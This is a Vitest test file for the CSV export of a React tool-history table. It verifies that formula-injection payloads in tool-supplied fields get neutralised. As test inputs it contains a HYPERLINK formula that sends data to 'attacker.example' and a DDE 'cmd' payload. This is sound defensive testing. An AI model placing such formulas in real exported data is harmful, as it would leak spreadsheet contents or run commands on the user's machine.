import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { act, cleanup, fireEvent, render, screen } from '@testing-library/react';
import { ToolHistoryTable } from './ToolHistoryTable';
import { useToolStore, type ActionLogEntry } from '../../stores/chat/toolStore';

const captured: string[] = [];

function entry(overrides: Partial<ActionLogEntry>): ActionLogEntry {
  return {
    id: 'a1',
    type: 'mcp',
    title: 'fetch_invoice',
    status: 'success',
    createdAt: new Date('2026-08-21T10:00:00Z'),
    updatedAt: new Date('2026-08-21T10:00:00Z'),
    ...overrides,
  };
}

function exportCsv(entries: ActionLogEntry[]): string {
  act(() => useToolStore.setState({ actionLog: entries }));
  render(<ToolHistoryTable />);
  fireEvent.click(screen.getByText('Export CSV'));
  const last = captured.at(-1);
  expect(last).toBeDefined();
  return last!;
}

beforeEach(() => {
  captured.length = 0;
  const RealBlob = globalThis.Blob;
  let pending: string | null = null;
  class RecordingBlob extends RealBlob {
    constructor(parts: BlobPart[] = [], options?: BlobPropertyBag) {
      super(parts, options);
      pending = parts.map(String).join('');
    }
  }
  vi.stubGlobal('Blob', RecordingBlob);
  URL.createObjectURL = vi.fn(() => 'blob:tool-history-test');
  URL.revokeObjectURL = vi.fn();
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {
    if (pending !== null) captured.push(pending);
    pending = null;
  });
});

afterEach(() => {
  cleanup();
  useToolStore.setState({ actionLog: [] });
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe('ToolHistoryTable · Export CSV', () => {
  it('neutralizes formulas in tool-controlled description, result and error', () => {
    const csv = exportCsv([
      entry({
        description: '=HYPERLINK("http://attacker.example/steal?u="&A1)',
        result: "=cmd|'/c calc'!A0",
        error: '@SUM(1+1)*cmd',
      }),
    ]);
    const row = csv.split('\n')[1]!;
    expect(row).toContain('"\'=HYPERLINK(""http://attacker.example/steal?u=""&A1)"');
    expect(row).toContain("'=cmd|'/c calc'!A0");
    expect(row).toContain("'@SUM(1+1)*cmd");
    expect(row).not.toContain(',=');
    expect(row).not.toContain(',@');
  });

  it('leaves benign values untouched', () => {
    const csv = exportCsv([entry({ title: 'read_file', description: 'ok', result: '42' })]);
    const row = csv.split('\n')[1]!;
    expect(row).toContain(',read_file,mcp,success,ok,42,');
  });
});
